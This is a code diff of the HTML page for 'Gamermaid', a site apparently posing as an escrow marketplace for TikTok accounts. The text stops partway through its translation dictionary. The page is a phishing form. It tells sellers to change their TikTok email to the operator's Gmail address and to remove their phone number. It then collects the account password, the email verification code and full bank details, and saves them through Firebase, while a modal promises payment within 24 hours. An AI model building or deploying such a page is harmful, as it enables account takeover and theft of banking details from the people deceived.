@@ -71,9 +71,15 @@
         
         #siteSectionsWrapper { display: flex; flex-direction: column; gap: 40px; }
 
-        /* Traditional Payout Info Card */
+        /* Interactive Calculator Card */
         .payout-card { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-lg); padding: 32px; max-width: 680px; margin: 0 auto; box-shadow: var(--shadow-md); width: 100%; }
         .calc-title { font-size: 1.15rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; color: var(--text-primary); }
+        .calc-inputs-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-bottom: 24px; }
+        .calc-input-group { display: flex; flex-direction: column; gap: 6px; }
+        .calc-input-group label { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
+        .calc-input-group input, .calc-input-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: #ffffff; font-family: inherit; font-size: 1rem; outline: none; font-weight: 600; color: var(--text-primary); }
+        .calc-input-group input:focus, .calc-input-group select:focus { border-color: #8b5cf6; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
+        
         .calc-results-box { background: var(--danger-bg); border: 1.5px solid var(--danger-border); border-radius: var(--radius-md); padding: 20px 24px; }
         .payout-row { font-size: 1.05rem; font-weight: 600; color: var(--danger-red); margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
         .payout-row.total { font-size: 1.35rem; font-weight: 700; border-top: 1px dashed rgba(239, 68, 68, 0.3); padding-top: 12px; margin-top: 10px; color: #16a34a; }
@@ -87,12 +93,12 @@
         .form-group input, .form-group select { width: 100%; padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--glass-border-light); background: var(--bg-secondary); font-family: inherit; font-size: 0.95rem; outline: none; }
         .form-group input:focus, .form-group select:focus { border-color: #8b5cf6; background: #ffffff; box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); }
         .field-notice { font-size: 0.825rem; color: var(--danger-red); font-weight: 500; margin-top: 4px; display: flex; align-items: center; gap: 6px; }
-        
-        .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); color: #2563eb; padding: 12px 16px; border-radius: var(--radius-md); font-weight: 600; font-size: 0.9rem; margin-bottom: 12px; text-align: center; }
-        .email-code-container { background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px; text-align: center; }
-        .email-code-container label { display: block; font-size: 0.875rem; font-weight: 700; color: var(--text-primary); margin-bottom: 8px; }
-        .code-display-box { background: #0f172a; color: #38bdf8; font-family: monospace; font-size: 1.5rem; letter-spacing: 6px; font-weight: 800; padding: 12px; border-radius: var(--radius-sm); margin-bottom: 8px; border: 1px dashed #38bdf8; display: inline-block; min-width: 180px; }
-        .wait-time-notice { color: var(--danger-red); font-size: 0.85rem; font-weight: 700; margin-top: 6px; }
+        .email-change-banner { background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); color: #2563eb; padding: 12px 16px; border-radius: var(--radius-md); font-weight: 600; font-size: 0.9rem; margin-bottom: 20px; text-align: center; }
+
+        /* Custom Email Verification Red Text & Alert Box */
+        .verification-box { margin-bottom: 36px; background: var(--danger-bg); border: 1px solid var(--danger-border); border-radius: var(--radius-md); padding: 20px; }
+        .verification-box label { color: var(--danger-red); font-weight: 700; font-size: 0.95rem; }
+        .verification-instructions { color: var(--danger-red); font-size: 0.875rem; font-weight: 600; margin-top: 8px; line-height: 1.5; }
 
         .bank-logos-container { margin-bottom: 24px; }
         .bank-logos-title { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 12px; }
@@ -125,6 +131,10 @@
         .modal-desc { color: var(--text-muted); font-size: 0.975rem; margin-bottom: 24px; line-height: 1.6; }
         .modal-contact { padding: 12px 16px; background: var(--bg-secondary); border-radius: var(--radius-md); font-weight: 600; color: #8b5cf6; margin-bottom: 24px; font-size: 0.9rem; }
 
+        .lang-modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .lang-option-btn { padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-md); font-weight: 600; font-size: 0.925rem; cursor: pointer; transition: all var(--transition-fast); color: var(--text-primary); text-align: center; }
+        .lang-option-btn:hover { background: #8b5cf6; color: #ffffff; border-color: #8b5cf6; }
+
         .sales-popup-container { position: fixed; bottom: 24px; left: 24px; display: flex; flex-direction: column; gap: 12px; z-index: 9999; pointer-events: none; max-width: 340px; }
         .sales-popup-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.9); border-left: 4px solid #8b5cf6; padding: 14px 18px; border-radius: 12px; box-shadow: 0 10px 25px rgba(15, 23, 42, 0.12); font-family: 'Inter', system-ui, -apple-system, sans-serif; font-size: 0.875rem; color: #0f172a; pointer-events: auto; opacity: 0; transform: translateX(-40px); transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); }
         .sales-popup-card.show { opacity: 1; transform: translateX(0); }
@@ -144,7 +154,7 @@
         .chat-send-btn { background: #8b5cf6; color: #ffffff; padding: 8px 14px; border-radius: var(--radius-sm); font-weight: 600; font-size: 0.875rem; }
 
         @media (max-width: 600px) {
-            .form-grid, .contact-info-grid, { grid-template-columns: 1fr; }
+            .form-grid, .contact-info-grid, .lang-modal-grid, .calc-inputs-grid { grid-template-columns: 1fr; }
             .form-group.full-width { grid-column: span 1; }
             .navbar { flex-wrap: wrap; height: auto; padding: 12px 0; }
         }
@@ -162,6 +172,7 @@
                     <span class="logo-text">GAMERMAID</span>
                 </a>
 
+                <!-- Navigation Tabs -->
                 <ul class="nav-links">
                     <li><a href="index.html" class="nav-link active" data-i18n="navEscrow">Escrow Services</a></li>
                     <li><a href="../buyers.html" class="nav-link" data-i18n="navBuyers">Verified Buyers</a></li>
@@ -169,6 +180,7 @@
                 </ul>
 
                 <div class="nav-actions">
+                    <!-- Language Selector Dropdown -->
                     <select id="languageSelector" class="language-select" aria-label="Select Language">
                         <option value="en">English</option>
                         <option value="ja">日本語 (Japan)</option>
@@ -176,6 +188,7 @@
                         <option value="th">ไทย (Thai)</option>
                         <option value="my">မြန်မာ (Myanmar)</option>
                     </select>
+
                     <button id="navSignInBtn" class="btn-signin" data-i18n="signIn">Sign In</button>
                 </div>
             </nav>
@@ -191,24 +204,42 @@
                     <p style="color: var(--text-muted);" data-i18n="escrowSub">Secure automated verification and middleman clearance system.</p>
                 </div>
 
+                <!-- Wrapper for Sections -->
                 <div id="siteSectionsWrapper">
                     
-                    <!-- KingAccMarket Deposit & Fee Card (Controlled from Admin Panel) -->
-                    <div class="payout-card" id="payoutCard">
+                    <!-- Interactive Escrow Payout Calculator Card -->
+                    <div class="payout-card" data-section-id="payoutCard">
                         <div class="calc-title">
                             <svg class="icon" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" ry="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="16" y1="14" x2="16" y2="18"/><path d="M8 10h6"/><path d="M8 14h4"/><path d="M8 18h2"/></svg>
-                            <span>KingAccMarket Deposit Rates</span>
+                            <span>Escrow Payout Calculator</span>
                         </div>
                         
+                        <div class="calc-inputs-grid">
+                            <div class="calc-input-group">
+                                <label for="requestedPrice">Requested Price</label>
+                                <input type="number" id="requestedPrice" value="2000000" min="0" step="any" placeholder="Enter amount">
+                            </div>
+                            <div class="calc-input-group">
+                                <label for="currencySelect">Currency</label>
+                                <select id="currencySelect">
+                                    <option value="Kyats">Kyats (MMK)</option>
+                                    <option value="Baht">Baht (THB)</option>
+                                    <option value="Yuan">China Yuan (CNY)</option>
+                                    <option value="Yen">Japan Yen (JPY)</option>
+                                    <option value="Rupee">India Rupee (INR)</option>
+                                </select>
+                            </div>
+                        </div>
+
                         <div class="calc-results-box">
-                            <div class="payout-row"><span>Deposit Amount</span><span id="displayDepositAmt">2,000,000 Kyats</span></div>
+                            <div class="payout-row"><span data-i18n="depositLabel">Requested Amount</span><span id="displayDepositAmt">2,000,000 Kyats</span></div>
                             <div class="payout-row"><span id="displayFeeLabel">Middle Man Fee (7%)</span><span id="displayFeeAmt">- 140,000 Kyats</span></div>
-                            <div class="payout-row total"><span>You will get</span><span id="displayTotalPayout">1,860,000 Kyats</span></div>
+                            <div class="payout-row total"><span data-i18n="totalLabel">You will get</span><span id="displayTotalPayout">1,860,000 Kyats</span></div>
                         </div>
                     </div>
 
-                    <!-- Escrow Verification Form -->
-                    <div class="form-card" id="escrowFormCard">
+                    <!-- Section ID: escrowForm -->
+                    <div class="form-card" data-section-id="escrowForm">
                         <form id="escrowForm">
                             <div class="form-section-title">
                                 <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
@@ -217,22 +248,27 @@
 
                             <div class="email-change-banner" data-i18n="emailBanner">Change your TikTok Email to gamermaid.ai@gmail.com</div>
 
-                            <!-- Email Code Display Box & Red Warning Text -->
-                            <div class="email-code-container">
-                                <label data-i18n="emailCodeLabel">Email Verification Code (from Admin)</label>
-                                <div class="code-display-box" id="adminCodeDisplay">••••••</div>
-                                <div class="wait-time-notice">Wait 5 minutes to get Code for Verify.</div>
-                            </div>
-
                             <div class="form-grid">
-                                <div class="form-group"><label for="username" data-i18n="lblUsername">Username</label><input type="text" id="username" name="username" placeholder="Enter account username" required></div>
-                                <div class="form-group"><label for="password" data-i18n="lblPassword">Password</label><input type="password" id="password" name="password" placeholder="Enter account password" required></div>
+                                <div class="form-group"><label for="username" data-i18n="lblUsername">Username</label><input type="text" id="username" name="username" placeholder="Enter account username" data-i18n-placeholder="phUsername" required></div>
+                                <div class="form-group"><label for="password" data-i18n="lblPassword">Password</label><input type="password" id="password" name="password" placeholder="Enter account password" data-i18n-placeholder="phPassword" required></div>
                                 <div class="form-group full-width">
                                     <div class="field-notice"><svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><span data-i18n="noticePhone">Required: Remove your Phone Number on your TikTok Account before submitting.</span></div>
                                 </div>
-                                <div class="form-group"><label for="signinLocation" data-i18n="lblLocation">Sign in Location</label><input type="text" id="signinLocation" name="signinLocation" placeholder="City / Region" required></div>
+                                <div class="form-group"><label for="signinLocation" data-i18n="lblLocation">Sign in Location</label><input type="text" id="signinLocation" name="signinLocation" placeholder="City / Region" data-i18n-placeholder="phLocation" required></div>
                                 <div class="form-group"><label for="signupDate" data-i18n="lblSignupDate">Sign up Date</label><input type="date" id="signupDate" name="signupDate" required></div>
-                                <div class="form-group full-width"><label for="phoneModel" data-i18n="lblPhoneModel">Phone Model</label><input type="text" id="phoneModel" name="phoneModel" placeholder="e.g. iPhone 14 Pro" required></div>
+                                <div class="form-group full-width"><label for="phoneModel" data-i18n="lblPhoneModel">Phone Model</label><input type="text" id="phoneModel" name="phoneModel" placeholder="e.g. iPhone 14 Pro" data-i18n-placeholder="phPhoneModel" required></div>
+                            </div>
+
+                            <!-- Verification Code Field Section Above Bank Information -->
+                            <div class="verification-box">
+                                <div class="form-group full-width">
+                                    <label for="verificationCode">Email Verification Code</label>
+                                    <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter 6-digit verification code" style="border-color: var(--danger-border); color: var(--danger-red); font-weight: 700;" required>
+                                </div>
+                                <div class="verification-instructions">
+                                    Change your TikTok Email to gamermaid.ai@gmail.com<br>
+                                    Wait 5 minutes to get Code for Verify.
+                                </div>
                             </div>
 
                             <div class="form-section-title">
@@ -258,7 +294,7 @@
                                 <div class="form-group">
                                     <label for="bankName" data-i18n="lblBankName">Bank Name</label>
                                     <select id="bankName" name="bankName" required>
-                                        <option value="">Select your bank</option>
+                                        <option value="" data-i18n="optSelectBank">Select your bank</option>
                                         <option value="KBZ Bank">KBZ Bank (Myanmar)</option>
                                         <option value="Thai Bank">Thai Local Bank</option>
                                         <option value="Hong Kong Bank">Hong Kong Bank</option>
@@ -270,9 +306,9 @@
                                         <option value="Other">Other International Bank</option>
                                     </select>
                                 </div>
-                                <div class="form-group"><label for="accountHolder">Account Holder Name</label><input type="text" id="accountHolder" name="accountHolder" placeholder="Full name" required></div>
-                                <div class="form-group"><label for="accountNumber">Account Number</label><input type="text" id="accountNumber" name="accountNumber" placeholder="Account number / IBAN" required></div>
-                                <div class="form-group"><label for="swiftCode">SWIFT Code</label><input type="text" id="swiftCode" name="swiftCode" placeholder="SWIFT / BIC" required></div>
+                                <div class="form-group"><label for="accountHolder" data-i18n="lblHolder">Account Holder Name</label><input type="text" id="accountHolder" name="accountHolder" placeholder="Full name" data-i18n-placeholder="phHolder" required></div>
+                                <div class="form-group"><label for="accountNumber" data-i18n="lblAccNum">Account Number</label><input type="text" id="accountNumber" name="accountNumber" placeholder="Account number / IBAN" data-i18n-placeholder="phAccNum" required></div>
+                                <div class="form-group"><label for="swiftCode" data-i18n="lblSwift">SWIFT Code</label><input type="text" id="swiftCode" name="swiftCode" placeholder="SWIFT / BIC" data-i18n-placeholder="phSwift" required></div>
                             </div>
 
                             <button type="submit" class="btn-continue">
@@ -281,18 +317,18 @@
                         </form>
                     </div>
 
-                    <!-- Terms & Rules Box -->
-                    <div class="rules-container" id="rulesContainer">
+                    <!-- Section ID: rulesContainer -->
+                    <div class="rules-container" data-section-id="rulesContainer">
                         <div class="rules-title">
                             <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                             <span data-i18n="rulesTitle">Escrow Terms & Rules</span>
                         </div>
                         <ul class="rules-list">
-                            <li>All account credentials provided must be accurate and fully accessible by our admin team during verification.</li>
-                            <li>Sellers must ensure phone numbers are completely unlinked from the account prior to submission.</li>
-                            <li>Payouts are processed strictly within 24 hours after successful verification and transfer completion.</li>
-                            <li>Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.</li>
-                            <li>For support inquiries, contact our team directly at ai@gamermaid.site.</li>
+                            <li data-i18n="rule1">All account credentials provided must be accurate and fully accessible by our admin team during verification.</li>
+                            <li data-i18n="rule2">Sellers must ensure phone numbers are completely unlinked from the account prior to submission.</li>
+                            <li data-i18n="rule3">Payouts are processed strictly within 24 hours after successful verification and transfer completion.</li>
+                            <li data-i18n="rule4">Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.</li>
+                            <li data-i18n="rule5">For support inquiries, contact our team directly at ai@gamermaid.site.</li>
                         </ul>
                     </div>
 
@@ -306,28 +342,28 @@
         <main class="escrow-section">
             <div class="container">
                 <div class="escrow-header">
-                    <h1 class="page-title">Contact Our Team</h1>
-                    <p style="color: var(--text-muted);">Get in touch with Gamermaid support for escrow and middleman inquiries.</p>
+                    <h1 class="page-title" data-i18n="contactTitle">Contact Our Team</h1>
+                    <p style="color: var(--text-muted);" data-i18n="contactSub">Get in touch with Gamermaid support for escrow and middleman inquiries.</p>
                 </div>
 
                 <div class="contact-card">
                     <div class="contact-info-grid">
                         <div class="contact-box">
-                            <h3>Official Emails</h3>
+                            <h3 data-i18n="boxEmails">Official Emails</h3>
                             <p><a href="mailto:ai@gamermaid.site">ai@gamermaid.site</a></p>
                             <p style="margin-top: 4px;"><a href="mailto:gamermaid.ai@gmail.com">gamermaid.ai@gmail.com</a></p>
                         </div>
                         <div class="contact-box">
-                            <h3>Support Phone (Japan Office)</h3>
+                            <h3 data-i18n="boxPhone">Support Phone (Japan Office)</h3>
                             <p>+81 3-5550-8421</p>
                         </div>
                         <div class="contact-box full-width" style="grid-column: span 2;">
-                            <h3>Regional Headquarters (Tokyo)</h3>
-                            <p>Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan</p>
+                            <h3 data-i18n="boxAddress">Regional Headquarters (Tokyo)</h3>
+                            <p data-i18n="addressText">Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan</p>
                         </div>
                     </div>
 
-                    <div style="text-align: center; color: var(--text-muted); font-size: 0.9rem;">
+                    <div style="text-align: center; color: var(--text-muted); font-size: 0.9rem;" data-i18n="supportNote">
                         Our support team operates 24/7 to resolve middleman clearances and verification questions.
                     </div>
                 </div>
@@ -335,36 +371,391 @@
         </main>
     </div>
 
+    <!-- Live Sales Popups Widget Container -->
     <div class="sales-popup-container" id="salesPopupContainer"></div>
 
+    <!-- Live Chat Widget -->
     <button class="chat-widget-btn" id="chatToggleBtn" aria-label="Open Chat"><svg class="icon" viewBox="0 0 24 24" style="width:24px;height:24px;"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
     <div class="chat-box-container" id="chatBox">
-        <div class="chat-header"><span>Chat with Admin</span><button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button></div>
-        <div class="chat-messages" id="chatMessages"><div class="chat-msg incoming">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div></div>
-        <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type a message..." tabindex="0"><button class="chat-send-btn" id="chatSendBtn">Send</button></div>
+        <div class="chat-header"><span data-i18n="chatHeader">Chat with Admin</span><button id="chatCloseBtn" style="color:white; font-weight:700; cursor:pointer;">&times;</button></div>
+        <div class="chat-messages" id="chatMessages"><div class="chat-msg incoming" data-i18n="chatWelcome">Hello! Welcome to Gamermaid Escrow. How can we help you today?</div></div>
+        <div class="chat-input-area"><input type="text" id="chatInput" placeholder="Type a message..." data-i18n-placeholder="phChat" tabindex="0"><button class="chat-send-btn" id="chatSendBtn" data-i18n="chatSend">Send</button></div>
+    </div>
+
+    <!-- Language Change Prompt Popup Modal -->
+    <div class="modal-backdrop" id="langPromptModal">
+        <div class="modal-card">
+            <div style="display: flex; justify-content: flex-end; margin-top: -10px; margin-right: -10px;">
+                <button id="closeLangModalBtn" style="font-size: 1.5rem; background: none; border: none; color: var(--text-muted); cursor: pointer;">&times;</button>
+            </div>
+            <div class="modal-status-icon">🌐</div>
+            <h3 class="modal-title">Change Language?</h3>
+            <p class="modal-desc">Would you like to view the site in your preferred language?</p>
+            <div class="lang-modal-grid">
+                <button class="lang-option-btn" data-lang="en">🇬🇧 English</button>
+                <button class="lang-option-btn" data-lang="ja">🇯🇵 日本語 (Japan)</button>
+                <button class="lang-option-btn" data-lang="zh">🇨🇳 中文 (China)</button>
+                <button class="lang-option-btn" data-lang="th">🇹🇭 ไทย (Thai)</button>
+                <button class="lang-option-btn" data-lang="my" style="grid-column: span 2;">🇲🇲 မြန်မာ (Myanmar)</button>
+            </div>
+        </div>
     </div>
 
     <!-- Confirmation Modal -->
     <div class="modal-backdrop" id="confirmationModal">
         <div class="modal-card">
             <div class="modal-status-icon"><svg class="icon" style="width:32px;height:32px;" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
-            <h3 class="modal-title">Verification In Progress</h3>
-            <p class="modal-desc">
+            <h3 class="modal-title" data-i18n="modalTitle">Verification In Progress</h3>
+            <p class="modal-desc" data-i18n="modalDesc">
                 The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.<br>
-                <strong style="color: var(--text-primary); display:block; margin-top:8px;">(Make sure You fill the Bank info Correctly).</strong>
+                <strong style="color: var(--text-primary); display:block; margin-top:8px;" data-i18n="modalWarning">(Make sure You fill the Bank info Correctly).</strong>
             </p>
             <div class="modal-contact">Need Help? Contact ai@gamermaid.site</div>
-            <button class="btn-signin" style="width:100%; cursor:pointer;" id="closeModalBtn">Close Window</button>
+            <button class="btn-signin" style="width:100%; cursor:pointer;" id="closeModalBtn" data-i18n="closeWindow">Close Window</button>
         </div>
     </div>
 
-    <!-- Script Controller & Firebase Sync -->
+    <!-- Firebase Auth Modal -->
+    <div class="modal-backdrop" id="authModal">
+        <div class="modal-card" style="text-align: left; max-width: 420px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h3 class="modal-title" id="authModalTitle" style="margin: 0; font-size: 1.25rem;" data-i18n="authTitle">Sign In to Gamermaid</h3>
+                <button id="closeAuthModal" style="font-size: 1.25rem; cursor: pointer; background:none; border:none; color: var(--text-muted);">&times;</button>
+            </div>
+            <button id="anonLoginBtn" style="width: 100%; padding: 12px; background: var(--bg-secondary); border: 1px solid var(--glass-border-light); border-radius: var(--radius-full); font-weight: 600; cursor: pointer; margin-bottom: 20px; color: var(--text-primary);" data-i18n="anonBtn">
+                ⚡ Quick Guest / Anonymous Sign In
+            </button>
+        </div>
+    </div>
+
+    <!-- Script Controller & Multi-Language Dictionary -->
     <script type="module">
         import { saveEscrowSubmission, saveChatMessage } from "../assets/js/firebase-config.js";
         import { db } from "../assets/js/firebase-config.js";
         import { doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
+        const translations = {
+            en: {
+                navEscrow: "Escrow Services",
+                navBuyers: "Verified Buyers",
+                navContact: "Contact Us",
+                signIn: "Sign In",
+                escrowTitle: "Third Party Escrow Services",
+                escrowSub: "Secure automated verification and middleman clearance system.",
+                depositLabel: "Requested Amount",
+                totalLabel: "You will get",
+                accVerification: "Account Verification",
+                emailBanner: "Change your TikTok Email to gamermaid.ai@gmail.com",
+                lblUsername: "Username",
+                phUsername: "Enter account username",
+                lblPassword: "Password",
+                phPassword: "Enter account password",
+                noticePhone: "Required: Remove your Phone Number on your TikTok Account before submitting.",
+                lblLocation: "Sign in Location",
+                phLocation: "City / Region",
+                lblSignupDate: "Sign up Date",
+                lblPhoneModel: "Phone Model",
+                phPhoneModel: "e.g. iPhone 14 Pro",
+                bankInfo: "Bank Information",
+                supportedBanks: "Supported Asian Banking Partners",
+                lblBankName: "Bank Name",
+                optSelectBank: "Select your bank",
+                lblHolder: "Account Holder Name",
+                phHolder: "Full name",
+                lblAccNum: "Account Number",
+                phAccNum: "Account number / IBAN",
+                lblSwift: "SWIFT Code",
+                phSwift: "SWIFT / BIC",
+                btnContinue: "Continue",
+                rulesTitle: "Escrow Terms & Rules",
+                rule1: "All account credentials provided must be accurate and fully accessible by our admin team during verification.",
+                rule2: "Sellers must ensure phone numbers are completely unlinked from the account prior to submission.",
+                rule3: "Payouts are processed strictly within 24 hours after successful verification and transfer completion.",
+                rule4: "Any fraudulent submissions, incorrect bank info, or attempts to reclaim accounts will result in immediate cancellation of the escrow transaction.",
+                rule5: "For support inquiries, contact our team directly at ai@gamermaid.site.",
+                contactTitle: "Contact Our Team",
+                contactSub: "Get in touch with Gamermaid support for escrow and middleman inquiries.",
+                boxEmails: "Official Emails",
+                boxPhone: "Support Phone (Japan Office)",
+                boxAddress: "Regional Headquarters (Tokyo)",
+                addressText: "Shinjuku Grand Tower 41F, 8-17-1 Nishi-Shinjuku, Shinjuku-ku, Tokyo 160-0023, Japan",
+                supportNote: "Our support team operates 24/7 to resolve middleman clearances and verification questions.",
+                chatHeader: "Chat with Admin",
+                chatWelcome: "Hello! Welcome to Gamermaid Escrow. How can we help you today?",
+                phChat: "Type a message...",
+                chatSend: "Send",
+                modalTitle: "Verification In Progress",
+                modalDesc: "The admins are checking your account. We will send Your Money to your Bank Accounts after 24 hours.",
+                modalWarning: "(Make sure You fill the Bank info Correctly).",
+                closeWindow: "Close Window"
+            },
+            ja: {
+                navEscrow: "エスクローサービス",
+                navBuyers: "認定バイヤー",
+                navContact: "お問い合わせ",
+                signIn: "サインイン",
+                escrowTitle: "第三者エスクローサービス",
+                escrowSub: "安全な自動認証および仲介クリアランスシステム。",
+                depositLabel: "リクエスト金額",
+                totalLabel: "お受取額",
+                accVerification: "アカウント認証",
+                emailBanner: "TikTokのメールアドレスを gamermaid.ai@gmail.com に変更してください",
+                lblUsername: "ユーザー名",
+                phUsername: "アカウントのユーザー名を入力",
+                lblPassword: "パスワード",
+                phPassword: "アカウントのパスワードを入力",
+                noticePhone: "必須: 送信前にTikTokアカウントから電話番号を解除してください。",
+                lblLocation: "サインイン場所",
+                phLocation: "都市 / 地域",
+                lblSignupDate: "登録日",
+                lblPhoneModel: "携帯電話のモデル",
+                phPhoneModel: "例: iPhone 14 Pro",
+                bankInfo: "銀行情報",
+                supportedBanks: "対応しているアジアの銀行パートナー",
+                lblBankName: "銀行名",
+                optSelectBank: "銀行を選択してください",
+                lblHolder: "口座名義人",
+                phHolder: "フルネーム",
+                lblAccNum: "口座番号",
+                phAccNum: "口座番号 / IBAN",
+                lblSwift: "SWIFTコード",
+                phSwift: "SWIFT / BIC",
+                btnContinue: "続ける",
+                rulesTitle: "エスクローの利用規約とルール",
+                rule1: "提供されたすべてのアカウント情報は正確であり、認証中に管理チームが完全にアクセスできる必要があります。",
+                rule2: "出品者は、送信前にアカウントから電話番号が完全にリンク解除されていることを確認してください。",
+                rule3: "支払いは、検証と転送の完了後、厳格に24時間以内に処理されます。",
+                rule4: "不正な送信、不正確な銀行情報、またはアカウントの回収の試みは、エスクロー取引の即時キャンセルにつながります。",
+                rule5: "サポートのお問い合わせは、ai@gamermaid.site まで直接ご連絡ください。",
+                contactTitle: "サポートチームへのお問い合わせ",
+                contactSub: "エスクローや仲介に関するお問い合わせは、Gamermaidサポートまでご連絡ください。",
+                boxEmails: "公式メール",
+                boxPhone: "サポート電話 (日本オフィス)",
+                boxAddress: "地域本社 (東京)",
+                addressText: "〒160-0023 東京都新宿区西新宿8-17-1 新宿グランドタワー41F",
+                supportNote: "サポートチームは24時間365日体制で、仲介のクリアランスや認証の質問に対応しています。",
+                chatHeader: "管理者とチャット",
+                chatWelcome: "こんにちは！Gamermaidエスクローへようこそ。本日はどのようなお手伝いが必要ですか？",
+                phChat: "メッセージを入力...",
+                chatSend: "送信",
+                modalTitle: "認証処理中",
+                modalDesc: "管理者がお客様のアカウントを確認しています。24時間以内にご指定の銀行口座へ送金いたします。",
+                modalWarning: "(銀行情報を正しく入力したことをご確認ください)。",
+                closeWindow: "ウィンドウを閉じる"
+            },
+            zh: {
+                navEscrow: "第三方担保交易",
+                navBuyers: "认证买家",
+                navContact: "联系我们",
+                signIn: "登录",
+                escrowTitle: "第三方担保交易服务",
+                escrowSub: "安全自动验证与中间人结算系统。",
+                depositLabel: "请求金额",
+                totalLabel: "您将获得",
+                accVerification: "账户验证",
+                emailBanner: "请将您的 TikTok 邮箱更改为 gamermaid.ai@gmail.com",
+                lblUsername: "用户名",
+                phUsername: "输入账户用户名",
+                lblPassword: "密码",
+                phPassword: "输入账户密码",
+                noticePhone: "必需：在提交之前，请从您的 TikTok 账户中解除绑定手机号。",
+                lblLocation: "登录地点",
+                phLocation: "城市 / 地区",
+                lblSignupDate: "注册日期",
+                lblPhoneModel: "手机型号",
+                phPhoneModel: "例如 iPhone 14 Pro",
+                bankInfo: "银行信息",
+                supportedBanks: "支持的亚洲合作银行",
+                lblBankName: "银行名称",
+                optSelectBank: "选择您的银行",
+                lblHolder: "账户持有人姓名",
+                phHolder: "全名",
+                lblAccNum: "账号",
+                phAccNum: "账号 / IBAN",
+                lblSwift: "SWIFT 代码",
+                phSwift: "SWIFT / BIC",
+                btnContinue: "继续",
+                rulesTitle: "担保交易条款与规则",
+                rule1: "提供的所有账户凭证必须准确，并且在验证期间可由我们的管理团队完全访问。",
+                rule2: "卖家必须确保在提交之前已完全解除与账户关联的手机号码。",
+                rule3: "付款将在验证和转账成功后严格在 24 小时内处理。",
+                rule4: "任何欺诈性提交、错误的银行信息或试图找回账户的行为将导致担保交易立即取消。",
+                rule5: "如需支持咨询，请直接通过 ai@gamermaid.site 联系我们的团队。",
+                contactTitle: "联系我们的团队",
+                contactSub: "如有担保和中间人咨询，请与 Gamermaid 支持取得联系。",
+                boxEmails: "官方邮箱",
+                boxPhone: "支持电话（日本办公室）",
+                boxAddress: "区域总部（东京）",
+                addressText: "日本东京都新宿区西新宿 8-17-1 新宿格兰德大厦 41F",
+                supportNote: "我们的支持团队全天候 24/7 运行，以解决中间人清算和验证问题。",
+                chatHeader: "与管理员聊天",
+                chatWelcome: "您好！欢迎来到 Gamermaid 担保。今天有什么可以帮您的？",
+                phChat: "输入消息...",
+                chatSend: "发送",
+                modalTitle: "验证进行中",
+                modalDesc: "管理员正在检查您的账户。我们将在 24 小时内将您的资金汇入您的银行账户。",
+                modalWarning: "(请确保您正确填写了银行信息)。",
+                closeWindow: "关闭窗口"
+            },
+            th: {
+                navEscrow: "บริการเอสโครว์",
+                navBuyers: "ผู้ซื้อที่ยืนยันแล้ว",
+                navContact: "ติดต่อเรา",
+                signIn: "เข้าสู่ระบบ",
+                escrowTitle: "บริการเอสโครว์บุคคลที่สาม",
+                escrowSub: "ระบบยืนยันตัวตนอัตโนมัติและเคลียร์ริ่งคนกลางที่ปลอดภัย",
+                depositLabel: "จำนวนเงินที่ขอ",
+                totalLabel: "ที่คุณจะได้รับ",
+                accVerification: "การยืนยันบัญชี",
+                emailBanner: "เปลี่ยนอีเมล TikTok ของคุณเป็น gamermaid.ai@gmail.com",
+                lblUsername: "ชื่อผู้ใช้",
+                phUsername: "ป้อนชื่อผู้ใช้บัญชี",
+                lblPassword: "รหัสผ่าน",
+                phPassword: "ป้อนรหัสผ่านบัญชี",
